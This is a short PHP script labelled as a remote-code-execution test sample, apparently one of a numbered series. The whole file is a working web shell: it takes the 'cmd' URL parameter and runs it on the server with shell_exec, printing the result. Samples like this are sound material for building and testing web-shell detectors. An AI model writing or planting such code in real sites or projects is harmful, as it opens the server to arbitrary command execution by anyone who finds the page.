<?php
// RCE test variation #778
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>